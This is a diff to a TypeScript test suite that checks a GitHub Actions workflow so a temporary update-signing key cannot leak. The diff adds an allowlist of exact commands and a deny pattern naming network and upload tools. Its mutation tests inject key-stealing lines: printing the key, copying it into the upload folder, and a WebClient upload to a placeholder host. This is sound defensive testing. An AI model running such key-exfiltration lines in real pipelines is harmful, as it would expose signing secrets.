@@ -262,7 +262,9 @@ function updaterTestProblems(workflow: Workflow): string[] {
   const jobs = Object.entries(workflow.jobs)
   const steps = jobs.flatMap(([name, job]) => (job.steps ?? []).map((step) => ({ job: name, step })))
   const indexed = steps.map(({ step }, index) => ({ step, index, run: step.run ?? '' }))
-  const lines = indexed.flatMap(({ run, index }) => run.split('\n').map((line) => ({ line: line.trim(), index })))
+  // Comments are not code: a check that is only written in a comment is not made. Blank lines go too.
+  const codeOf = (run: string) => run.split('\n').map((line) => line.replace(/(^|\s)#.*$/, '').trim()).filter((line) => line !== '')
+  const lines = indexed.flatMap(({ run, index }) => codeOf(run).map((line) => ({ line, index })))
   const text = JSON.stringify(workflow)
 
   // The key never leaves the one job: no other job to hand it to, no output, no file or variable that outlives a step.
@@ -291,7 +293,7 @@ function updaterTestProblems(workflow: Workflow): string[] {
   }
 
   // Hidden in the log before it is used, and read by that line alone: nothing prints it, copies it or moves it.
-  const hiding = indexed.filter(({ run }) => run.includes('::add-mask::'))
+  const hiding = lines.filter(({ line }) => line.includes('::add-mask::'))
   const making = indexed.find(({ run }) => /\bsigner\s+generate\b/.test(run))
   if (hiding.length === 0) problems.push('does not hide the key in the log (::add-mask::)')
   else if (making !== undefined && hiding.some(({ index }) => index < making.index)) problems.push('hides the key before it exists')
@@ -332,6 +334,66 @@ function updaterTestProblems(workflow: Workflow): string[] {
   for (const { line } of building) {
     if (!/--config \$conf\b/.test(line)) problems.push('a build does not use the run config (--config $conf)')
     if (!/--bundles nsis\b/.test(line)) problems.push('a build makes more than the installer')
+  }
+
+  // Every line that touches the key, the run config or the runner's temp folder is one of these exact lines, and no other: a longer line, a
+  // different path, an extra flag or a second command on the same line is refused, so nothing can be added to a step that handles the key
+  // without this test noticing. (The security review of 2026-10-21 got past a pattern list with a .NET call, a path built in the line, `+=`
+  // on the variable and a deletion with -WhatIf; an allowlist has no such gaps.)
+  const KEY_LINES: RegExp[] = [
+    /^\$key = Join-Path \$env:RUNNER_TEMP 'updater-test-run\.key'$/,
+    /^\$conf = Join-Path \$env:RUNNER_TEMP 'updater-test-run\.conf\.json'$/,
+    /^npm run tauri -w @listulator\/desktop -- signer generate --ci -w \$key$/,
+    /^Write-Output "::add-mask::\$\(\(Get-Content \$key -Raw\)\.Trim\(\)\)"$/,
+    /^npm run updater:test-config -- config --pubkey-file "\$key\.pub" --out \$conf$/,
+    /^npm run tauri:build -w @listulator\/desktop -- --bundles nsis --config \$conf -- --locked$/,
+    /^npm run tauri -w @listulator\/desktop -- signer sign -f \$key --password= --app-version \$env:UPDATE_VERSION \$installer$/,
+    /^npm run updater:test-config -- verify --pubkey-file "\$key\.pub" --installer \$installer --version \$env:UPDATE_VERSION --installed-version \$env:VERSION$/,
+    /^npm run updater:test-config -- staging --dir updater-test-out --key-file \$key$/,
+    /^Remove-Item \(Join-Path \$env:RUNNER_TEMP 'updater-test-run\.key\*'\) -Force -ErrorAction SilentlyContinue$/,
+  ]
+  for (const { line } of lines) {
+    if (/\$\{?(key|conf)\b|\.key\b|_temp\b|RUNNER_TEMP/i.test(line) && !KEY_LINES.some((allowed) => allowed.test(line))) {
+      problems.push(`touches the key, the run config or the runner's temp folder outside the allowed commands: ${line.slice(0, 80)}`)
+    }
+  }
+  if (lines.some(({ line }) => /\b(Set-Variable|New-Variable|Get-Variable|Remove-Variable|Clear-Variable|sv|gv|nv)\b/i.test(line))) problems.push('uses variable cmdlets (a way to reach $key by another name)')
+  if (lines.some(({ line }) => /WebClient|HttpClient|Net\.Sockets|\bUpload(File|String|Data)\b|Start-BitsTransfer|\b(nc|ncat|ssh|scp|ftp|sftp)\b/i.test(line))) problems.push('uses a network or upload command')
+
+  // A failed command stops the step: each one is followed by its exit-code check, and nothing forces a success.
+  const EXIT_CHECK = 'if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }'
+  for (const { run } of indexed) {
+    const own = codeOf(run)
+    own.forEach((line, at) => {
+      if (/^npm run (tauri|tauri:build|updater:|version:set)/.test(line) && at < own.length - 1 && own[at + 1] !== EXIT_CHECK) {
+        problems.push(`a command is not followed by its exit-code check: ${line.slice(0, 60)}`)
+      }
+    })
+  }
+  if (lines.some(({ line }) => /\bexit\s+0\b|LASTEXITCODE\s*=/.test(line))) problems.push('forces a success (exit 0 or a changed LASTEXITCODE)')
+
+  // No step can be skipped: the only `if` is the deletion's, which is exactly always(). Nothing but three actions runs.
+  for (const { step } of indexed) {
+    if (step.if !== undefined && !(step.if === 'always()' && /Remove-Item/.test(step.run ?? ''))) problems.push("a step has an if: other than the deletion step's always()")
+    if (step.uses !== undefined && !/^actions\/(checkout|setup-node|upload-artifact)@[0-9a-f]{40}$/.test(step.uses)) {
+      problems.push(`uses ${step.uses.split('@')[0]}, outside the allowed three actions (checkout, setup-node, upload-artifact)`)
+    }
+  }
+
+  // The first step checks both versions before anything else runs (before the checkout, the key and any native command that takes them).
+  const first = steps[0]?.step
+  const firstRun = first?.run ?? ''
+  if (
+    first === undefined ||
+    first.uses !== undefined ||
+    first.env?.['VERSION'] !== '${{ inputs.version }}' ||
+    first.env?.['UPDATE_VERSION'] !== '${{ inputs.update_version }}' ||
+    !/-notmatch/.test(firstRun) ||
+    !/\$env:VERSION\b/.test(firstRun) ||
+    !/\$env:UPDATE_VERSION\b/.test(firstRun) ||
+    !/\bthrow\b/.test(firstRun)
+  ) {
+    problems.push('does not check the two versions first (before the checkout and before the key)')
   }
 
   // One artifact, an exact list of names: the two installers, the update's signature and the manifest. Nothing the key could ride along in.
@@ -1094,7 +1156,30 @@ describe('the updater test build', () => {
       ['no check of the upload folder', (t) => t.replace('updater:test-config -- staging', 'echo skipped'), /does not check the upload folder/],
       ['a build that does not use the run config', (t) => t.replace(/--config \$conf/, '--config src-tauri/tauri.updater-test.conf.json'), /does not use the run config/],
       ['a build of more than the installer', (t) => t.replace(/--bundles nsis/, '--bundles all'), /makes more than the installer/],
-      ['a secret', (t) => t.replace('        shell: pwsh', '        env:\n          K: ${{ secrets.KEY }}\n        shell: pwsh'), /secret or the token/],
+      // The security review's probes (2026-10-21): each of these passed the first version of the rules.
+      ['the key read by a .NET call and printed', (t) => t.replace('exit $LASTEXITCODE }\n          Write-Output', 'exit $LASTEXITCODE }\n          $k = [IO.File]::ReadAllText($key); Write-Output ($k.ToCharArray() -join " ")\n          Write-Output'), /outside the allowed commands/],
+      ['the key printed through a path built in the line', (t) => t.replace('exit $LASTEXITCODE }\n          Write-Output', "exit $LASTEXITCODE }\n          Write-Output (Get-Content (Join-Path $env:RUNNER_TEMP 'updater-test-run.key') -Raw)\n          Write-Output"), /outside the allowed commands/],
+      ['the key copied to the upload folder by its path', (t) => t.replace('exit $LASTEXITCODE }\n          Write-Output', "exit $LASTEXITCODE }\n          Copy-Item (Join-Path $env:RUNNER_TEMP 'updater-test-run.key') updater-test-out\n          Write-Output"), /outside the allowed commands/],
+      ['$key moved by an assignment', (t) => t.replace('exit $LASTEXITCODE }\n          Write-Output', "exit $LASTEXITCODE }\n          $key += '/../../x'\n          Write-Output"), /outside the allowed commands/],
+      ['$key redefined by a variable cmdlet', (t) => t.replace('exit $LASTEXITCODE }\n          Write-Output', "exit $LASTEXITCODE }\n          Set-Variable -Name ke -Value 'x'\n          Write-Output"), /variable cmdlets/],
+      ['the temp folder listed by its literal path', (t) => t.replace('exit $LASTEXITCODE }\n          Write-Output', 'exit $LASTEXITCODE }\n          Get-ChildItem D:\\a\\_temp\n          Write-Output'), /outside the allowed commands|the runner's temp folder by its literal path/],
+      ['a verification that is switched off', (t) => t.replace('      - name: The update verifies against this run\'s key, fails against the real one, and is newer\n', "      - name: The update verifies against this run's key, fails against the real one, and is newer\n        if: false\n"), /a step has an if: other than/],
+      ['a staging check behind a condition', (t) => t.replace('      - name: Nothing to upload holds the key\n', "      - name: Nothing to upload holds the key\n        if: ${{ inputs.version != 'x' }}\n"), /a step has an if: other than/],
+      ['the delete step with a different condition', (t) => t.replace('if: always()', 'if: failure()'), /does not delete the key in a step that always runs|a step has an if: other than/],
+      ['the staging check commented out', (t) => t.replace('npm run updater:test-config -- staging', '# npm run updater:test-config -- staging'), /does not check the upload folder/],
+      ['the hiding of the key commented out', (t) => t.replace('Write-Output "::add-mask::', '# Write-Output "::add-mask::'), /does not hide the key|outside the allowed commands/],
+      ['a staging check whose failure is ignored', (t) => t.replace('--key-file $key\n          if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }', '--key-file $key\n          exit 0'), /not followed by its exit-code check|forces a success/],
+      ['a check followed by exit 0 on the same line', (t) => t.replace('--installed-version $env:VERSION', '--installed-version $env:VERSION; exit 0'), /outside the allowed commands|forces a success/],
+      ['a deletion that deletes nothing (-WhatIf)', (t) => t.replace('-Force -ErrorAction SilentlyContinue', '-Force -WhatIf'), /outside the allowed commands|does not delete/],
+      ['a deletion of another file', (t) => t.replace("'updater-test-run.key*'", "'nothing.key*'"), /outside the allowed commands|does not delete/],
+      ['the wrong file embedded as the public key', (t) => t.replace('--pubkey-file "$key.pub" --out $conf', '--pubkey-file "$key" --out $conf'), /outside the allowed commands/],
+      ['a cache action that could save the temp folder', (t) => t.replace('      - name: Install dependencies', `      - uses: actions/cache/save@${'a'.repeat(40)} # v1\n        with:\n          path: \${{ runner.temp }}\n          key: y\n      - name: Install dependencies`), /outside the allowed three/],
+      ['an artifact merge action', (t) => t.replace('      - name: Install dependencies', `      - uses: actions/upload-artifact/merge@${'a'.repeat(40)} # v1\n        with:\n          name: x\n      - name: Install dependencies`), /outside the allowed three/],
+      ['a script action that could read the key', (t) => t.replace('      - name: Install dependencies', `      - uses: actions/github-script@${'a'.repeat(40)} # v1\n        with:\n          script: return 1\n      - name: Install dependencies`), /outside the allowed three/],
+      ['a .NET upload of a file', (t) => t.replace('exit $LASTEXITCODE }\n          Write-Output', "exit $LASTEXITCODE }\n          [Net.WebClient]::new().UploadFile('http://example.invalid', 'x')\n          Write-Output"), /network or upload command/],
+      ['a first step that no longer checks the two versions', (t) => t.replace(/-notmatch/g, '-match'), /does not check the two versions first/],
+      ['the version check moved after the checkout', (t) => t.replace(/ {6}- name: The versions are versions[\s\S]*?(?= {6}- uses: actions\/checkout)/, '').replace('      - name: Install dependencies', '      - name: The versions are versions\n        shell: pwsh\n        env:\n          VERSION: ${{ inputs.version }}\n          UPDATE_VERSION: ${{ inputs.update_version }}\n        run: |\n          if ($env:VERSION -notmatch "^x$" -or $env:UPDATE_VERSION -notmatch "^x$") { throw "no" }\n      - name: Install dependencies'), /does not check the two versions first/],
+      ['a secret', (t) => t.replace('      - name: Install dependencies\n        run: npm ci --ignore-scripts', '      - name: Install dependencies\n        env:\n          K: ${{ secrets.KEY }}\n        run: npm ci --ignore-scripts'), /secret or the token/],
       ['a push trigger', (t) => t.replace('on:\n  workflow_dispatch:', 'on:\n  push:\n  workflow_dispatch:'), /not by hand only/],
     ]
 
